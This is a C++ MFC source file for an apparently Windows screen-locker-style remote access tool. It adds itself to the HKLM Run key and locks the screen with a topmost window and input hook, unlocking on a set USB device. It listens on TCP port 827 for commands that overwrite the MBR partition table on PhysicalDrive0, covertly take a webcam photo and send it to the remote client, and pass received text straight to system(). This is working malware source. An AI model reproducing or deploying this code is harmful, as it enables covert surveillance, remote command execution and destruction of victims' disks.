
// NDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "N.h"
#include "NDlg.h"
#include "afxdialogex.h"
#include <Dbt.h>
#include<winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include<iostream>
#include <VersionHelpers.h>
#include <string.h>
#include<afxsock.h>
#include <winioctl.h>
#include "cv.h"
#include<highgui.h>
#include <opencv2\opencv.hpp> 
#pragma comment (lib,"ws2_32")
using namespace std;
using namespace cv;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define WM_USER_NOTIFYICON WM_USER+1
_declspec(dllimport) void SetHook(bool q);

CSocket photosocket;


#define BOOTRECORDSIZE 440

typedef struct _BOOTRECORD {


	unsigned char BootRecord[BOOTRECORDSIZE];


}BOOTRECORD, *PBOOTRECORD;

#define DPTSIZE 64

typedef struct _DPT {


	unsigned char Dpt[DPTSIZE];


}DPT, *PDPT;





typedef struct _MBR {

	BOOTRECORD BootRecord;              //引导程序
	unsigned char ulSinged[4];          //Windows 磁盘签名
	unsigned char sReserve[2];          //保留位
	DPT Dpt;                            //分区表
	unsigned char EndSign[2];           //结束标志




}MBR, *PMBR;

#define DPTNUMBER 4
typedef struct _DP {

	unsigned char BootSign;           //引导标志
	unsigned char StartHsc[3];
	unsigned char Partitiontype;        //分区类型
	unsigned char EndHsc[3];
	unsigned int SectorsPreceding;    //本分区之前使用的扇区数
	unsigned int SectorInPartition;
}DP, *PDP;



// CNDlg 对话框
CBrush m_brush;

HKEY hWrite;
HKEY hUsb;
TCHAR pUsbnum[MAX_PATH] = _T("HGH");
TCHAR pUsbnum1[MAX_PATH] = _T("USB\\VID_090C&PID_1000\\AA00000000003671");

TCHAR pFileName[MAX_PATH] = _T("HGH");

DWORD dw = GetModuleFileName(NULL, pFileName, MAX_PATH);
DWORD du;
DWORD dUSize = sizeof(pUsbnum);
CString String;
int flag=0;
CSocket serverSocket;




int Sender(TCHAR FileName[]) {
	AfxSocketInit();


	int tag = 0;
	DWORD dwRead;

	BOOL bRet;
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	char ReadBuf[102400];
	CHAR SendBuf[4096];
	CHAR End[5] = { "End!" };
	//bRet = ReadFile(hFile, ReadBuf, 102400, &dwRead, NULL);
	while (TRUE) {




		bRet = ReadFile(hFile, ReadBuf, 102400, &dwRead, NULL);
		if (bRet == 0) {

			//MessageBox(NULL, L"ReadFile ERROR!", L"Error", MB_OK);
			break;

		}

		else if (dwRead == 0) {
			send(serverSocket, End, 5, 0);
			Sleep(1500);
			break;
		}

		else
		{
			//MessageBox(NULL, L"Send Buf ", L"Error", MB_OK);
			send(serverSocket
				, ReadBuf, 102400, 0);
		}

		

		//recv(s, szBufferAccpect, MAXBYTE, NULL);

		//	cout<<"Server:"<<szBufferAccpect<<endl;



	}
	/*closesocket(s);
	WSACleanu0p();*/
	//send(serverSocket, End, 1024, 0);
	//serverSocket.Close();
	//serverSocket.Close();
	CloseHandle(hFile);
	//	MessageBox(NULL, L"Send Bufer OK", L"Error", MB_OK);

	return tag = 1;
}


int TakePhoto() {
	int tag = 0;
	char keyCode = 0;
	IplImage  outimage;
	Mat input_image;
	VideoCapture cam(0);
	if (!cam.isOpened()) exit(0);
	namedWindow("input image");
	/*while (true) {
	if (27 == waitKey(30)) {
	break;
	}*/
	cam >> input_image;
	//imshow("input image", input_image);

	/*f (keyCode == 13) {*/

	outimage = input_image;

	CHAR* outImageName = "E://test.jpg";
	cvSaveImage(outImageName, &outimage);
	//Sender(L"D://test.jpg");


	cvDestroyAllWindows();
	tag=Sender(L"E://test.jpg");
	return tag;

}








void kill(HANDLE hDevice, int check) {

	MBR Mbr = { 0 };

	DWORD dwRead = 0;
	DWORD dwBytesReturned = 0;
	DWORD dwNumberOfBytesWritten = 0;
	PMBR pMbrKill = &Mbr;


	unsigned char FixMbr[16] = { 0x00 ,0xFE ,0xFF ,0xFF ,0x0F ,0xFE ,0xFF ,0xFF ,0x00 ,0x70 ,0xC8 ,0x0E ,0x00 ,0x48 ,0x1F ,0x00 };

	if (ReadFile(hDevice, (LPVOID)pMbrKill, 512, &dwRead, NULL)) {

		printf("ReadFile successful  \r\n");

	}
	/*for (int i = 0; i < 512; i++) {
	printf("%02X ", ((BYTE*)pMbrKill)[i]);
	if ((i + 1) % 16 == 0) {
	printf("\r\n");
	}
	}*/

	CloseHandle(hDevice);

	if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL)) {
		printf("CreateFile successful");
	}
	/*for (int i = 0; i < 3; i++) {
	Mbr.Dpt.Dpt[i] = { 0 };      //删除主分区2
	}*/

	for (int i = 48; i < 64; i++) {
		/*printf("%02X ", Mbr.Dpt.Dpt[i]);
		if ((i + 1) % 16 == 0) {
		printf("\r\n");
		}*/
		Mbr.Dpt.Dpt[i] = { 0 };
	}

	if (DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{
		//cout << "LOCK successful \r\n" << endl;

	}
	//cin >> check;
	if (check == 1) {

		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			//printf("Kill Mbr SUCCESSFUL %d \r\n", dwNumberOfBytesWritten);
			//MessageBox(NULL, _T("KIll Mbr SUCCESSFUL!!"), NULL, MB_OK);
			CloseHandle(hDevice);
		}

	}
	else if (check == 2) {

		for (int i = 48, j = 0; i < 64; i++, j++) {
			/*printf("%02X ", Mbr.Dpt.Dpt[i]);
			if ((i + 1) % 16 == 0) {
			printf("\r\n");
			}*/
			Mbr.Dpt.Dpt[i] = FixMbr[j];
		}
		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			//printf("fix Mbr SUCCESSFUL %d \r\n", dwNumberOfBytesWritten);
			//MessageBox(NULL, _T("fix Mbr SUCCESSFUL!!"), NULL, MB_OK);
			CloseHandle(hDevice);
		}
	}
	if (DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{
		//	cout << "UNLOCK successful \r\n" << endl;

	}

	/*for (int i = 0; i < 512; i++) {
	printf("%02X ", ((BYTE*)pMbrKill)[i]);
	if ((i + 1) % 16 == 0) {
	printf("\r\n");
	}
	}*/

}

int server(){
	AfxSocketInit();


	int flag = 0;
	int tag=0;
	CSocket aSocket;
	aSocket.Socket();
	UINT nPort = atoi("827");
	BOOL bOptVal = TRUE;
	char szRecvMsg[7] = { 0 };
	int bOptLen = sizeof(BOOL);
	char key[7] = { "nibiru" };
	char lock[7]{"holmes"};
	char Kill[7] = {"kilmbr"};
	char Fix[7] = {"fixmbr"};
	char Photo[7] = { "photos" };
	char Shutdown[7] = { "shutdn" };
	char cmd[20] = { 0 };
	aSocket.SetSockOpt(SO_REUSEADDR, (void *)&bOptVal, bOptLen, SOL_SOCKET);
	CString cs;
	aSocket.Bind(nPort);
	aSocket.Listen();



	aSocket.Accept(serverSocket);
	
	//AfxMessageBox(L"Accept");
	serverSocket.Receive(szRecvMsg, 6);
	//sprintf_s(szRecvMsg,sizeof(szRecvMsg), "接受到的参数是: %s \r\n", szRecvMsg);
	cs = szRecvMsg;

	if (!strcmp(szRecvMsg, key)){
		
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
		SetHook(false);
		tag = 1;

	}
	else if (!strcmp(szRecvMsg, lock)) {
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
		SetHook(true);
		tag = 1;
	}
	
	else if (!strcmp(szRecvMsg, Kill)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 1);

	}
	else if (!strcmp(szRecvMsg, Fix)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 2);
		
	}
	else if (!strcmp(szRecvMsg, Photo)) {


		//MessageBox(NULL, L"Take photo", L"Error", MB_OK);
		flag=TakePhoto();
		while (!flag) {}
		//photosocket = serverSocket;

	}
	else if(!strcmp(szRecvMsg, Shutdown)) {
		memset(cmd,0,20);
		serverSocket.Receive(cmd, sizeof(cmd));
		//MessageBox(NULL,cmd, L"Error", MB_OK);
	//	WinExec(cmd, SW_SHOW);
		system(cmd);

	}
	serverSocket.Close();//关闭  
	aSocket.Close();
	return tag;

}

CNDlg::CNDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CNDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CNDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_MESSAGE(WM_USER_NOTIFYICON, OnNotifyMsg)//消息映射
	ON_BN_CLICKED(IDOK, &CNDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CNDlg::OnBnClickedCancel)
	
	
END_MESSAGE_MAP()


// CNDlg 消息处理程序

BOOL CNDlg::OnInitDialog()
{
	
	
	
	CDialogEx::OnInitDialog();
	//SetHook(true);
	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
	m_tnid.cbSize = sizeof NOTIFYICONDATA;
	m_tnid.hWnd = this->m_hWnd;
	m_tnid.uID = IDR_MAINFRAME;
	m_tnid.hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
	m_tnid.uCallbackMessage = WM_USER_NOTIFYICON;
	m_tnid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP; //OK,下面就是托盘产生了.   
	Shell_NotifyIcon(NIM_ADD, &m_tnid);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL,
	REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hWrite, &dw);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hWrite);
	RegSetValueEx(hWrite, L"Nibiru Holmes", 0, REG_SZ, (const PBYTE)pFileName, (_tcslen(pFileName) + 1) * sizeof(TCHAR));
	
	SetHook(true);
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
	while (1){ server(); }
	
	//CreateThread(NULL, 0, Server2, NULL, 0, NULL);
	
	
	// TODO:  在此添加额外的初始化代码
	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CNDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	int cxScreen, cyScreen;//窗口大小设置
	cxScreen = GetSystemMetrics(SM_CXSCREEN);
	cyScreen = GetSystemMetrics(SM_CYSCREEN);
	SetWindowPos(&wndTopMost, 0, 0, cxScreen, cyScreen, SWP_SHOWWINDOW);//将窗口保持在最前面。
	//SetHook(true);
	//server();
	
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CNDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

char FirstDriveFromMask(ULONG unitmask)//盘符获取
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

LRESULT CNDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{

	// TODO: 在此添加专用代码和/或调用基类
	switch (message)
	{
		//WM_DEVICECHANGE，系统硬件改变发出的系统消息
	case WM_DEVICECHANGE:
	{
							PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
							switch (wParam)
							{
							case WM_DEVICECHANGE:
								break;
							case DBT_DEVICEARRIVAL://DBT_DEVICEARRIVAL，设备检测结束，并且可以使用
							{
													   if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//逻辑卷
													   {
														   PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
														   switch (lpdbv->dbcv_flags)
														   {
														   case 0:                //U盘
														   {
																					  CString decDriver;
																					  decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																					  //TRACE1("检测到U盘:[%s]插入!\n",decDriver.GetBuffer(0))
																					  //AfxMessageBox(L"检测到U盘插入");
																					  RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR\\Enum", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hUsb);
																					  RegQueryValueEx(hUsb, L"0", NULL, NULL, (LPBYTE)pUsbnum, &dUSize);
																					  //MessageBox((LPCTSTR)pUsbnum1);
																					  //MessageBox((LPCTSTR)pUsbnum);
																					  


																					  if (!(lstrcmp(pUsbnum,pUsbnum1))){
																						 
																						 
																						  AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
																					     
																				          SetHook(false);
																					  }
																					  
																					  

														   }
															   break;
														   }
													   }
							}
								break;
							case DBT_DEVICEREMOVECOMPLETE://DBT_DEVICEREMOVECOMPLETE,设备卸载或者拔出
							{
															  if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//逻辑卷
															  {
																  PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
																  switch (lpdbv->dbcv_flags)
																  {
																  case 0:                //U盘
																  {
																							 CString decDriver;
																							 decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																							 //TRACE1("检测到U盘:[%s]拔出!\n",decDriver.GetBuffer(0));								
																							 
																							 AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
																							// AfxMessageBox(L"look");
																							 
																							 /*while (!flag){
																								 flag = Server();
																							 
																							 }*/
																							// AfxMessageBox(L"unlook");
																							 SetHook(true);
																							
																  }
																	  break;
																  }
															  }
							}
								break;
							}
	}
		break;
		while (1){ server(); }
	}
	//托盘运行的消息处理
	switch (message) //判断消息类型  
	{
	case WM_USER_NOTIFYICON:
		//如果是用户定义的消息   
		if (lParam == WM_LBUTTONDBLCLK)

		{
			//鼠标双击时主窗口出现   
			if (AfxGetApp()->m_pMainWnd->IsWindowVisible()) //判断窗口当前状态  
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE); //隐藏窗口  
			}
			else
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW); //显示窗口   
			}

		}
		/*else if(lParam==WM_RBUTTONDOWN)
		{ //鼠标右键单击弹出选单
		CMenu menu;
		menu.LoadMenu(IDR_MENU1); //载入事先定义的选单
		CMenu *pMenu=menu.GetSubMenu(0);
		CPoint pos;
		GetCursorPos(&pos);
		pMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON,pos.x,pos.y,AfxGetMainWnd());
		} */
		break;
	case WM_SYSCOMMAND:
		//如果是系统消息   
		if (wParam == SC_MINIMIZE)
		{
			//接收到最小化消息时主窗口隐藏   
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
			return 0;
		}
		if (wParam == SC_CLOSE)
		{
			::Shell_NotifyIcon(NIM_DELETE, &m_tnid); //关闭时删除系统托盘图标  
		}
		break;
	}


	return CDialog::WindowProc(message, wParam, lParam);
}

LRESULT  CNDlg::OnNotifyMsg(WPARAM wparam, LPARAM lparam)  //自定义消息响应代码
//wParam接收的是图标的ID，而lParam接收的是鼠标的行为     
{
	if (wparam != IDR_MAINFRAME)
		return    1;
	switch (lparam)
	{
		/*case  WM_RBUTTONUP://右键起来时弹出快捷菜单，这里只有一个“关闭”
		{
		LPPOINT    lpoint=new    tagPOINT;
		::GetCursorPos(lpoint);//得到鼠标位置
		CMenu    menu;
		menu.CreatePopupMenu();//声明一个弹出式菜单
		//增加菜单项“关闭”，点击则发送消息WM_DESTROY给主窗口（已
		//隐藏），将程序结束。
		menu.AppendMenu(MF_STRING,WM_DESTROY,"关闭");
		//确定弹出式菜单的位置
		menu.TrackPopupMenu(TPM_LEFTALIGN,lpoint->x,lpoint->y,this);
		//资源回收
		HMENU    hmenu=menu.Detach();
		menu.DestroyMenu();
		delete    lpoint;
		}
		break; */
	case    WM_LBUTTONDBLCLK://双击左键的处理     
	{
								 this->ShowWindow(SW_SHOW);//简单的显示主窗口     
	}
		break;
	}

	return 0;
}

void CNDlg::OnBnClickedOk()
{
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
	while (1){ server(); }
	// TODO:  在此添加控件通知处理程序代码
	
}


void CNDlg::OnBnClickedCancel()
{
	
	//SetHook(true);
	while (1){ server(); }
	
	// TODO:  在此添加控件通知处理程序代码
	
	//CreateThread(NULL, 0, Server, NULL, 0, NULL);
	//Sleep(20000);
}




